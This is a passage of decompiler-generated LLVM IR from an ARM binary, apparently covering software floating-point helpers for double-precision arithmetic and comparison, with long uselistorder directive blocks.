  store i32 %v10_164d4, i32* %r5.global-to-local, align 4
  %v14_164d4 = and i32 %v10_164d4, %v6_164d0
  %v16_164d4 = icmp slt i32 %v10_164d4, 0
  %v17_164d4 = icmp eq i32 %v6_164d0, 2047
  br label %bb109

bb109:                                            ; preds = %dec_label_pc_164c8, %bb108
  %v2_164dc.in = phi i32 [ %v9_164d0, %dec_label_pc_164c8 ], [ %v14_164d4, %bb108 ]
  %v1_164dc = phi i1 [ %v11_164d0, %dec_label_pc_164c8 ], [ %v16_164d4, %bb108 ]
  %v0_164dc = phi i1 [ %v12_164d0, %dec_label_pc_164c8 ], [ %v17_164d4, %bb108 ]
  %v2_164dc = icmp slt i32 %v2_164dc.in, 0
  %v3_164d8 = xor i1 %v2_164dc, %v1_164dc
  %v4_164d8 = or i1 %v0_164dc, %v3_164d8
  br i1 %v4_164d8, label %bb111, label %bb110

bb110:                                            ; preds = %bb109
  %v9_164d885 = mul i32 %v6_164d0, 1048576
  %v10_164d886 = or i32 %v9_164d885, %v5_164cc
  store i32 %v10_164d886, i32* %r0.global-to-local, align 4
  store i32 %v3_16364, i32* @r4, align 4
  store i32 %v6_16364, i32* @r5, align 4
  ret i32 %v10_164d886

bb111:                                            ; preds = %bb109
  %v1_164e0 = or i32 %v5_164cc, 1048576
  store i32 %v1_164e0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v1_164e8 = add nsw i32 %v2_16384, 1022
  store i32 %v1_164e8, i32* @r4, align 4
  %v3_164e8 = sub nsw i32 -1023, %v2_16384
  %v4_164e8 = and i32 %v6_164d0, %v3_164e8
  %v5_164e8 = icmp slt i32 %v4_164e8, 0
  store i1 %v5_164e8, i1* @cpsr_v, align 1
  %v6_164e8 = icmp slt i32 %v2_16384, -1022
  store i1 %v6_164e8, i1* @cpsr_n, align 1
  %v7_164e8 = icmp eq i32 %v6_164d0, 1
  store i1 %v7_164e8, i1* @cpsr_z, align 1
  %v1_164ec = call i32 @function_161dc(i32 %v1_164e0)
  store i32 %v1_164ec, i32* %r0.global-to-local, align 4
  %v0_164f0 = load i32, i32* @r5, align 4
  %v1_164f0 = load i32, i32* @r6, align 4
  %v2_164f0 = or i32 %v1_164f0, %v0_164f0
  store i32 %v2_164f0, i32* @lr, align 4
  %v1_164f4 = call i32 @function_161dc(i32 %v1_164ec)
  store i32 %v1_164f4, i32* %r0.global-to-local, align 4
  %v0_164f8.pre = load i32, i32* @ip, align 4
  %v0_164fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_164f8

dec_label_pc_164f8:                               ; preds = %.thread1, %.thread2, %bb93, %bb111
  %v4_164f8.pre-phi = phi i32 [ %v5_16374, %.thread1 ], [ %.pre148.pre-phi, %.thread2 ], [ %v5_16374, %bb93 ], [ %v5_16374, %bb111 ]
  %v0_164fc = phi i32 [ %v5_16370, %.thread1 ], [ %v5_16370, %.thread2 ], [ %v5_16370, %bb93 ], [ %v0_164fc.pre, %bb111 ]
  %v2_16500 = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb93 ], [ %v0_164f8.pre, %bb111 ]
  %v5_164f8 = and i32 %v2_16500, %v4_164f8.pre-phi
  store i32 %v5_164f8, i32* @r5, align 4
  %v4_164fc = icmp eq i32 %v2_16500, %v0_164fc
  br i1 %v4_164fc, label %bb112, label %bb113

bb112:                                            ; preds = %dec_label_pc_164f8
  %v5_16500 = icmp eq i32 %v5_164f8, %v2_16500
  br label %bb113

bb113:                                            ; preds = %dec_label_pc_164f8, %bb112
  %v0_16504 = phi i1 [ false, %dec_label_pc_164f8 ], [ %v5_16500, %bb112 ]
  call void @__pseudo_cond_branch(i1 %v0_16504, i32 ptrtoint (i32* @global_var_16358.442 to i32))
  %v0_16508 = load i32, i32* @r4, align 4
  %v1_16508 = load i32, i32* @ip, align 4
  %v4_16508 = icmp eq i32 %v1_16508, %v0_16508
  br i1 %v4_16508, label %dec_label_pc_16510, label %dec_label_pc_1652c

dec_label_pc_16510:                               ; preds = %bb113
  %v0_16510 = load i32, i32* @r1, align 4
  %v1_16510 = load i32, i32* %r0.global-to-local, align 4
  %v4_16510 = mul i32 %v1_16510, 4096
  %v5_16510 = or i32 %v4_16510, %v0_16510
  store i32 %v5_16510, i32* %r4.global-to-local, align 4
  %v1_16514 = icmp ne i32 %v5_16510, 0
  call void @__pseudo_cond_branch(i1 %v1_16514, i32 ptrtoint (i32* @global_var_16358.442 to i32))
  %v0_16518 = load i32, i32* @r5, align 4
  %v1_16518 = load i32, i32* @ip, align 4
  %v1_1651c = icmp ne i32 %v1_16518, %v0_16518
  call void @__pseudo_cond_branch(i1 %v1_1651c, i32 ptrtoint (i32* @global_var_16340.443 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_16528 = call i32 @function_16358(i32 %arg3, i32 %arg4)
  store i32 %v2_16528, i32* %r0.global-to-local, align 4
  %v1_1652c.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1652c

dec_label_pc_1652c:                               ; preds = %bb113, %dec_label_pc_16510
  %v1_1652c = phi i32 [ %v1_16508, %bb113 ], [ %v1_1652c.pre, %dec_label_pc_16510 ]
  %v0_1652c = load i32, i32* @r5, align 4
  %v4_1652c = icmp eq i32 %v0_1652c, %v1_1652c
  br i1 %v4_1652c, label %dec_label_pc_16534, label %dec_label_pc_1652c.dec_label_pc_16548_crit_edge

dec_label_pc_1652c.dec_label_pc_16548_crit_edge:  ; preds = %dec_label_pc_1652c
  %v1_16548.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16534:                               ; preds = %dec_label_pc_1652c
  %v4_16534 = mul i32 %arg3, 4096
  %v5_16534 = or i32 %v4_16534, %arg4
  store i32 %v5_16534, i32* %r5.global-to-local, align 4
  %v7_16534 = icmp eq i32 %v5_16534, 0
  call void @__pseudo_cond_branch(i1 %v7_16534, i32 ptrtoint (i32* @global_var_162f4.444 to i32))
  store i32 %arg4, i32* @r1, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_16544 = call i32 @function_16358(i32 %arg3, i32 %arg4)
  store i32 %v2_16544, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16548

dec_label_pc_16548:                               ; preds = %dec_label_pc_1652c.dec_label_pc_16548_crit_edge, %dec_label_pc_16534
  %v1_16548 = phi i32 [ %v1_16548.pre, %dec_label_pc_1652c.dec_label_pc_16548_crit_edge ], [ %v2_16544, %dec_label_pc_16534 ]
  %v0_16548 = load i32, i32* @r1, align 4
  %v3_16548 = mul i32 %v1_16548, 2
  %v4_16548 = or i32 %v3_16548, %v0_16548
  store i32 %v4_16548, i32* %r6.global-to-local, align 4
  %v6_16548 = icmp eq i32 %v4_16548, 0
  br i1 %v6_16548, label %dec_label_pc_16548._crit_edge, label %bb114

dec_label_pc_16548._crit_edge:                    ; preds = %dec_label_pc_16548
  %.pre = mul i32 %arg3, 2
  %.pre80 = or i32 %.pre, %arg4
  br label %bb115

bb114:                                            ; preds = %dec_label_pc_16548
  %v4_1654c = mul i32 %arg3, 2
  %v5_1654c = or i32 %v4_1654c, %arg4
  store i32 %v5_1654c, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1654c, 0
  br label %bb115

bb115:                                            ; preds = %dec_label_pc_16548._crit_edge, %bb114
  %v4_1655c.pre-phi = phi i32 [ %.pre80, %dec_label_pc_16548._crit_edge ], [ %v5_1654c, %bb114 ]
  %v0_16550 = phi i1 [ false, %dec_label_pc_16548._crit_edge ], [ %phitmp, %bb114 ]
  call void @__pseudo_cond_branch(i1 %v0_16550, i32 ptrtoint (i32* @global_var_1628c.445 to i32))
  %v0_16554 = load i32, i32* @r1, align 4
  %v1_16554 = load i32, i32* %r0.global-to-local, align 4
  %v3_16554 = mul i32 %v1_16554, 2
  %v4_16554 = or i32 %v3_16554, %v0_16554
  store i32 %v4_16554, i32* %r4.global-to-local, align 4
  %v1_16558 = icmp ne i32 %v4_16554, 0
  call void @__pseudo_cond_branch(i1 %v1_16558, i32 ptrtoint (i32* @global_var_16340.443 to i32))
  store i32 %v4_1655c.pre-phi, i32* %r5.global-to-local, align 4
  %v1_16560 = icmp ne i32 %v4_1655c.pre-phi, 0
  call void @__pseudo_cond_branch(i1 %v1_16560, i32 ptrtoint (i32* @global_var_162f4.444 to i32))
  %v0_16564 = load i32, i32* %r0.global-to-local, align 4
  %v1_16564 = load i32, i32* @r1, align 4
  %v2_16564 = call i32 @function_16358(i32 %v0_16564, i32 %v1_16564)
  store i32 %v2_16564, i32* %r0.global-to-local, align 4
  ret i32 %v2_16564

; uselistorder directives
  uselistorder i32 %v5_1654c, { 1, 0, 2 }
  uselistorder i32 %v1_16508, { 1, 0 }
  uselistorder i32 %v10_164d4, { 2, 0, 1 }
  uselistorder i32 %v6_164d0, { 3, 4, 0, 1, 2, 6, 5, 7 }
  uselistorder i32 %v5_164cc, { 1, 0, 2 }
  uselistorder i32 %v2_164b4, { 1, 0, 2 }
  uselistorder i32 %v1_164b4, { 1, 0, 2 }
  uselistorder i32 %v1_164b0, { 1, 0, 2 }
  uselistorder i32 %v0_164b0, { 1, 0, 2 }
  uselistorder i1 %v7_164a4, { 1, 0 }
  uselistorder i32 %v2_16488, { 1, 0 }
  uselistorder i32 %v3_16474, { 2, 1, 0 }
  uselistorder i32 %v3_16468, { 0, 2, 1 }
  uselistorder i32 %v5_16464, { 2, 0, 1 }
  uselistorder i32 %v6_16454, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_16440, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1643c, { 3, 0, 2, 1 }
  uselistorder i32 %v0_16448, { 0, 2, 1 }
  uselistorder i32 %v1_16454, { 1, 0 }
  uselistorder i32 %v6_16438, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_16424, { 1, 2, 0, 3 }
  uselistorder i32 %v3_16420, { 0, 2, 1 }
  uselistorder i32 %v0_1642c, { 0, 2, 1 }
  uselistorder i32 %v1_16438, { 1, 0 }
  uselistorder i32 %v6_1641c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v15_16408, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16410, { 0, 2, 1 }
  uselistorder i32 %v1_1641c, { 1, 0 }
  uselistorder i32 %v3_16400, { 2, 1, 0, 3, 4 }
  uselistorder i1 %v3_163f4, { 1, 2, 0 }
  uselistorder i32 %v3_1647413, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_1647017, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v0_163f4, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16400, { 1, 0 }
  uselistorder i32 %storemerge136, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_1649c.ph, { 1, 0, 3, 2 }
  uselistorder i32 %v3_163e0, { 1, 0 }
  uselistorder i32 %v0_163e4, { 1, 0 }
  uselistorder i32 %v3_163d0, { 1, 0 }
  uselistorder i1 %v1_163c4, { 1, 0 }
  uselistorder i32 %v3_163b4, { 2, 3, 1, 0 }
  uselistorder i32 %v5_163b0, { 3, 2, 1, 0 }
  uselistorder i32 %v3_163a8, { 2, 1, 0 }
  uselistorder i32 %v5_163a4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_16384, { 1, 5, 6, 4, 2, 3, 0, 7, 10, 9, 8, 11 }
  uselistorder i32 %v6_16374, { 2, 3, 1, 0 }
  uselistorder i32 %v5_16374, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_16370, { 5, 4, 3, 2, 6, 1, 0 }
  uselistorder i32 %v1_16370, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v6_16364, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 4, 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7 }
  uselistorder i32* %r0.global-to-local, { 20, 17, 18, 19, 4, 15, 16, 5, 2, 3, 14, 6, 21, 7, 8, 11, 9, 10, 12, 13, 0, 1 }
  uselistorder i32 (i32, i32)* @function_16358, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_161dc, { 1, 0 }
  uselistorder i1* @cpsr_n, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 1024, { 2, 0, 13, 14, 3, 15, 1, 4, 16, 17, 18, 5, 6, 19, 7, 20, 8, 21, 22, 23, 24, 12, 25, 11, 26, 10, 27, 28, 29, 9 }
  uselistorder i32 -1023, { 2, 0, 1, 3 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 14, 15, 16, 23, 21, 22, 20, 18, 19, 1, 17, 2 }
  uselistorder i32 1791, { 1, 0 }
  uselistorder i32 536870912, { 2, 3, 0, 4, 1 }
  uselistorder i32 16, { 0, 5, 3, 4, 6, 7, 23, 8, 9, 1, 10, 11, 52, 53, 31, 32, 33, 91, 34, 92, 93, 35, 94, 95, 36, 96, 97, 98, 99, 100, 101, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 37, 65, 50, 85, 102, 25, 66, 67, 68, 71, 72, 73, 74, 75, 76, 77, 78, 49, 69, 70, 51, 12, 13, 14, 15, 16, 24, 17, 18, 2, 19, 20, 26, 39, 40, 79, 80, 41, 81, 42, 82, 43, 83, 84, 44, 38, 86, 30, 87, 29, 88, 28, 27, 45, 89, 22, 90, 46, 21, 47, 48 }
  uselistorder i32 8, { 0, 1, 2, 3, 4, 5, 64, 63, 37, 6, 7, 27, 8, 35, 68, 128, 139, 45, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 46, 69, 70, 71, 72, 73, 74, 75, 76, 77, 9, 47, 78, 44, 79, 80, 65, 81, 82, 83, 84, 85, 86, 156, 66, 10, 114, 127, 132, 131, 129, 130, 133, 134, 135, 136, 137, 138, 11, 155, 50, 51, 48, 49, 29, 30, 42, 43, 52, 157, 87, 90, 91, 92, 61, 93, 94, 95, 96, 36, 97, 56, 57, 98, 99, 100, 53, 101, 102, 103, 104, 41, 31, 32, 105, 106, 58, 88, 89, 67, 12, 13, 62, 38, 14, 15, 28, 16, 107, 108, 109, 110, 111, 59, 33, 17, 60, 34, 18, 112, 113, 54, 115, 116, 19, 117, 118, 20, 119, 21, 120, 121, 22, 23, 122, 123, 124, 125, 24, 55, 40, 25, 39, 26, 126 }
  uselistorder i32 4, { 5, 6, 150, 211, 212, 149, 7, 8, 206, 156, 157, 158, 159, 160, 9, 161, 10, 86, 77, 78, 11, 265, 79, 67, 12, 13, 80, 81, 266, 267, 268, 269, 82, 270, 271, 272, 273, 83, 274, 275, 276, 277, 278, 14, 279, 280, 281, 282, 283, 84, 66, 284, 285, 286, 287, 288, 289, 15, 16, 85, 162, 163, 164, 165, 87, 166, 167, 168, 169, 170, 68, 65, 171, 172, 173, 174, 175, 176, 177, 290, 291, 292, 294, 295, 106, 107, 108, 109, 239, 240, 241, 242, 17, 153, 110, 154, 111, 69, 155, 213, 112, 214, 215, 0, 232, 233, 234, 235, 70, 113, 114, 245, 247, 246, 243, 244, 248, 249, 250, 251, 252, 253, 254, 255, 256, 115, 116, 117, 118, 293, 178, 18, 19, 20, 21, 1, 237, 22, 72, 2, 23, 119, 49, 24, 25, 179, 120, 26, 121, 122, 123, 124, 125, 180, 27, 181, 126, 182, 183, 184, 185, 186, 187, 188, 127, 189, 190, 191, 192, 193, 194, 50, 197, 128, 129, 196, 151, 195, 28, 29, 73, 30, 31, 74, 263, 264, 148, 32, 33, 51, 52, 53, 34, 199, 35, 36, 54, 37, 38, 198, 39, 130, 40, 200, 201, 202, 88, 203, 89, 55, 131, 90, 204, 91, 56, 132, 92, 57, 93, 205, 94, 58, 133, 95, 59, 208, 207, 209, 210, 75, 217, 216, 76, 96, 218, 134, 135, 219, 220, 136, 137, 221, 99, 222, 97, 223, 100, 60, 138, 98, 224, 225, 226, 227, 228, 229, 230, 105, 71, 41, 231, 139, 61, 62, 42, 236, 43, 44, 102, 101, 103, 63, 140, 104, 141, 64, 142, 143, 45, 238, 46, 47, 48, 257, 258, 259, 260, 261, 262, 144, 145, 146, 147, 3, 4, 152 }
  uselistorder i32 32, { 58, 59, 60, 61, 32, 33, 41, 54, 55, 35, 36, 62, 34, 42, 63, 64, 65, 66, 39, 67, 83, 43, 44, 37, 68, 48, 22, 69, 70, 79, 2, 1, 4, 3, 6, 5, 38, 71, 21, 72, 0, 49, 73, 74, 75, 76, 77, 23, 78, 56, 57, 84, 50, 51, 8, 7, 25, 10, 9, 24, 12, 11, 26, 40, 80, 81, 82, 14, 13, 27, 45, 52, 28, 16, 15, 18, 17, 29, 30, 20, 19, 31, 46, 47, 53 }
  uselistorder i32 33, { 3, 4, 5, 2, 6, 7, 1, 0 }
  uselistorder i32 768, { 1, 0 }
  uselistorder i32 253, { 2, 3, 4, 0, 1 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 16777216, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 44, 43, 23, 24, 25, 26, 29, 27, 30, 28, 33, 31, 34, 32, 36, 35, 38, 37, 40, 39, 42, 41 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 117, 36, 37, 118, 38, 119, 39, 120, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 56, 55, 54, 59, 58, 57, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 114, 74, 70, 71, 75, 72, 73, 115, 76, 78, 77, 79, 80, 81, 84, 82, 83, 85, 86, 87, 89, 88, 90, 91, 92, 95, 93, 94, 96, 97, 99, 98, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 116 }
  uselistorder i32 1048576, { 17, 0, 1, 2, 18, 19, 12, 3, 4, 5, 20, 6, 7, 21, 22, 13, 14, 8, 9, 23, 24, 25, 16, 26, 10, 15, 11 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 8, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 0, 27, 28, 1, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 2, 45, 46, 47, 48, 3, 49, 50, 51, 52, 53, 54, 55, 56, 4, 57, 58, 59, 60, 61, 62, 63, 125, 130, 64, 65, 9, 10, 11, 103, 104, 105, 106, 122, 123, 124, 12, 100, 7, 101, 102, 13, 5, 66, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 14, 15, 16, 78, 79, 80, 81, 92, 93, 94, 95, 126, 127, 128, 129, 96, 6, 97, 98, 99, 107, 108, 109 }
  uselistorder i32* @r5, { 35, 36, 37, 19, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 20, 21, 54, 22, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 6, 83, 84, 181, 182, 183, 184, 185, 186, 234, 235, 85, 86, 87, 88, 89, 90, 91, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 2, 105, 106, 107, 108, 109, 110, 248, 249, 250, 251, 3, 252, 253, 254, 111, 112, 113, 114, 115, 116, 23, 24, 25, 26, 27, 28, 29, 187, 7, 1, 188, 189, 190, 191, 192, 205, 206, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 117, 118, 119, 178, 179, 8, 180, 256, 257, 258, 259, 120, 9, 121, 122, 123, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 124, 125, 10, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 17, 137, 138, 11, 139, 140, 141, 142, 143, 16, 144, 145, 146, 147, 18, 151, 12, 152, 153, 154, 155, 156, 157, 158, 159, 5, 160, 161, 162, 163, 164, 30, 31, 148, 4, 149, 150, 165, 13, 166, 167, 168, 169, 33, 32, 15, 34, 260, 261, 170, 171, 14, 172, 173, 255, 174, 175, 176, 177, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 207, 208, 209 }
  uselistorder i32 %arg4, { 3, 2, 5, 4, 6, 9, 8, 0, 1, 7, 10 }
  uselistorder i32 %arg3, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %dec_label_pc_16548, { 1, 0 }
  uselistorder label %dec_label_pc_1652c, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %dec_label_pc_164f8, { 3, 2, 1, 0 }
  uselistorder label %bb109, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_163f0, { 1, 0 }
  uselistorder label %dec_label_pc_163d8, { 1, 0 }
  uselistorder label %bb97, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_16568(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16568:
  store i32 -1, i32* @ip, align 4
  %v0_1656c = call i32 @function_1657c()
  ret i32 %v0_1656c
}

define i32 @function_16570(i32 %arg1) local_unnamed_addr {
dec_label_pc_16570:
  store i32 1, i32* @ip, align 4
  %v0_16574 = call i32 @function_1657c()
  ret i32 %v0_16574

; uselistorder directives
  uselistorder i32 ()* @function_1657c, { 1, 0 }
}

define i32 @function_16578() local_unnamed_addr {
dec_label_pc_16578:
  %v0_16578 = load i32, i32* @r0, align 4
  ret i32 %v0_16578
}

define i32 @function_1657c() local_unnamed_addr {
dec_label_pc_1657c:
  %v0_1657c = load i32, i32* @ip, align 4
  %v0_16580 = load i32, i32* @r0, align 4
  %v2_16580 = mul i32 %v0_16580, 2
  %v2_16580.off = add i32 %v2_16580, 4194303
  %tmp = icmp ult i32 %v2_16580.off, 2097152
  %v0_16588 = load i32, i32* @r2, align 4
  %v2_16588 = mul i32 %v0_16588, 2
  br i1 %tmp, label %dec_label_pc_165d8, label %bb

bb:                                               ; preds = %dec_label_pc_1657c
  %v2_16588.off = add i32 %v2_16588, 4194303
  %tmp26 = icmp ult i32 %v2_16588.off, 2097152
  br i1 %tmp26, label %dec_label_pc_165cc, label %dec_label_pc_16594

dec_label_pc_16594:                               ; preds = %dec_label_pc_165e0, %dec_label_pc_165ec, %bb
  %v0_16594 = load i32, i32* @r1, align 4
  %v4_16594 = or i32 %v0_16594, %v2_16580
  store i32 %v4_16594, i32* @ip, align 4
  %v6_16594 = icmp eq i32 %v4_16594, 0
  br i1 %v6_16594, label %bb14, label %.thread

bb14:                                             ; preds = %dec_label_pc_16594
  %v1_16598 = load i32, i32* @r3, align 4
  %v5_16598 = or i32 %v1_16598, %v2_16588
  store i32 %v5_16598, i32* @ip, align 4
  %v7_16598 = icmp eq i32 %v5_16598, 0
  br i1 %v7_16598, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_16594, %bb14
  %v3_1659c = xor i32 %v0_16588, %v0_16580
  %v5_1659c = icmp eq i32 %v3_1659c, 0
  br i1 %v5_1659c, label %.thread..thread1_crit_edge, label %.thread2.thread

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_165a0.pre = load i32, i32* @r3, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb14
  %v2_165a0 = phi i32 [ %v2_165a0.pre, %.thread..thread1_crit_edge ], [ %v1_16598, %bb14 ]
  %v5_165a0 = icmp eq i32 %v2_165a0, %v0_16594
  br i1 %v5_165a0, label %bb15, label %.thread1..thread2.thread_crit_edge

.thread1..thread2.thread_crit_edge:               ; preds = %.thread1
  %.pre24 = xor i32 %v0_16588, %v0_16580
  br label %.thread2.thread

bb15:                                             ; preds = %.thread1
  ret i32 0

.thread2.thread:                                  ; preds = %.thread1..thread2.thread_crit_edge, %.thread
  %v2_165b0.pre-phi = phi i32 [ %.pre24, %.thread1..thread2.thread_crit_edge ], [ %v3_1659c, %.thread ]
  %v3_165b0 = icmp slt i32 %v2_165b0.pre-phi, 0
  br i1 %v3_165b0, label %..thread7_crit_edge, label %bb16

bb16:                                             ; preds = %.thread2.thread
  %v10_165b4 = icmp eq i32 %v0_16580, %v0_16588
  br i1 %v10_165b4, label %bb17, label %bb18

bb17:                                             ; preds = %bb16
  %v2_165b8 = load i32, i32* @r3, align 4
  %v4_165b8 = icmp ult i32 %v0_16594, %v2_165b8
  br i1 %v4_165b8, label %..thread7_crit_edge, label %bb19

bb18:                                             ; preds = %bb16
  %v4_165b4 = icmp ult i32 %v0_16580, %v0_16588
  br i1 %v4_165b4, label %..thread7_crit_edge, label %bb19

..thread7_crit_edge:                              ; preds = %bb17, %bb18, %.thread2.thread
  %.pre12 = ashr i32 %v0_16588, 31
  br label %.thread7

bb19:                                             ; preds = %bb17, %bb18
  %v2_165bc = and i32 %v0_16588, 1073741824
  %v3_165bc = icmp eq i32 %v2_165bc, 0
  %v4_165bc = ashr i32 %v0_16588, 31
  br i1 %v3_165bc, label %.thread7, label %bb20

.thread7:                                         ; preds = %bb19, %..thread7_crit_edge
  %v4_165c0.pre-phi = phi i32 [ %.pre12, %..thread7_crit_edge ], [ %v4_165bc, %bb19 ]
  %v5_165c0 = sub nsw i32 -1, %v4_165c0.pre-phi
  br label %bb20

bb20:                                             ; preds = %bb19, %.thread7
  %v0_165c4 = phi i32 [ %v4_165bc, %bb19 ], [ %v5_165c0, %.thread7 ]
  %v1_165c4 = or i32 %v0_165c4, 1
  ret i32 %v1_165c4

dec_label_pc_165cc:                               ; preds = %bb
  br label %dec_label_pc_165e0

dec_label_pc_165d8:                               ; preds = %dec_label_pc_1657c
  %v0_165d8 = load i32, i32* @r1, align 4
  %v4_165d8 = mul i32 %v0_16580, 4096
  %v5_165d8 = or i32 %v0_165d8, %v4_165d8
  store i32 %v5_165d8, i32* @ip, align 4
  %v7_165d8 = icmp eq i32 %v5_165d8, 0
  br i1 %v7_165d8, label %dec_label_pc_165d8.dec_label_pc_165e0_crit_edge, label %dec_label_pc_165f4

dec_label_pc_165d8.dec_label_pc_165e0_crit_edge:  ; preds = %dec_label_pc_165d8
  %v2_16588.off25 = add i32 %v2_16588, 4194303
  %tmp27 = icmp ult i32 %v2_16588.off25, 2097152
  br label %dec_label_pc_165e0

dec_label_pc_165e0:                               ; preds = %dec_label_pc_165d8.dec_label_pc_165e0_crit_edge, %dec_label_pc_165cc
  %v3_165e4.pre-phi = phi i1 [ %tmp27, %dec_label_pc_165d8.dec_label_pc_165e0_crit_edge ], [ true, %dec_label_pc_165cc ]
  br i1 %v3_165e4.pre-phi, label %dec_label_pc_165ec, label %dec_label_pc_16594

dec_label_pc_165ec:                               ; preds = %dec_label_pc_165e0
  %v0_165ec = load i32, i32* @r3, align 4
  %v4_165ec = mul i32 %v0_16588, 4096
  %v5_165ec = or i32 %v0_165ec, %v4_165ec
  store i32 %v5_165ec, i32* @ip, align 4
  %v7_165ec = icmp eq i32 %v5_165ec, 0
  br i1 %v7_165ec, label %dec_label_pc_16594, label %dec_label_pc_165f4

dec_label_pc_165f4:                               ; preds = %dec_label_pc_165d8, %dec_label_pc_165ec
  ret i32 %v0_1657c

; uselistorder directives
  uselistorder i32 %v4_165bc, { 1, 0 }
  uselistorder i32 %v1_16598, { 1, 0 }
  uselistorder i32 %v0_16594, { 2, 0, 1 }
  uselistorder i32 %v2_16588, { 0, 2, 1 }
  uselistorder i32 %v0_16588, { 0, 5, 6, 4, 8, 7, 2, 3, 1 }
  uselistorder i32 %v2_16580, { 1, 0 }
  uselistorder i32 %v0_16580, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 1073741824, { 2, 3, 4, 0, 1 }
  uselistorder i32 31, { 16, 7, 5, 12, 14, 17, 6, 23, 18, 15, 4, 19, 2, 1, 0, 8, 10, 9, 11, 3, 20, 21, 22, 13 }
